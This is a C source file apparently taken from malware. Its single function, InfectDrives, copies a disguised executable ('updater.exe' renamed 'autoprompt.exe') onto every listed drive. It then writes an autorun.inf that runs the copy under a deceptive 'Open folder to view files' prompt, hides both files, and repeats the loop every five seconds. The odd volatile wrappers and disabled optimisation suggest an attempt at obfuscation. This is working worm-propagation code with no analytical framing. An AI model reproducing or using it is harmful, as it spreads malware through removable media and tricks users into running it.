#include "data_globals.h"
#include <stdio.h>
#include <string.h>

#pragma optimize("", off)
void InfectDrives(void)
{
    char IFile[256], NewFile[256], Autorun[256], InfFile[256];

    volatile int i_buf[2] = {{0, (int)0}};
    volatile int *p_i = (volatile int *)&i_buf[0];

    volatile FILE* runfile_buf[2] = {{NULL, (FILE*)0}};
    volatile FILE* *p_runfile = (volatile FILE* *)&runfile_buf[0];

    GetSystemDirectoryA(IFile, sizeof(IFile));
    strcat(IFile, "\\updater.exe");

    while (1) {
        for ((*p_i) = 0; Inf_Drives[(*p_i)]; (*p_i)++) {
            memset(NewFile, 0, sizeof(NewFile));
            memset(Autorun, 0, sizeof(Autorun));
            memset(InfFile, 0, sizeof(InfFile));

            strcpy(NewFile, Inf_Drives[(*p_i)]);
            strcpy(Autorun, Inf_Drives[(*p_i)]);

            strcat(NewFile, "\\autoprompt.exe");
            strcat(Autorun, "\\autorun.inf");

            if (CopyFileA(IFile, NewFile, FALSE)) {
                (*p_runfile) = fopen(Autorun, "wb");
                if ((*p_runfile)) {
                    sprintf(InfFile,
                            "[autorun]\r\nopen=autoprompt.exe\r\naction=Open folder to view files\r\n");
                    fputs(InfFile, (*p_runfile));
                    fclose((*p_runfile));
                }
                SetFileAttributesA(NewFile, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_NOT_CONTENT_INDEXED);
                SetFileAttributesA(Autorun, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_NOT_CONTENT_INDEXED);
            }
        }
        Sleep(5000);
    }
}
#pragma optimize("", on)
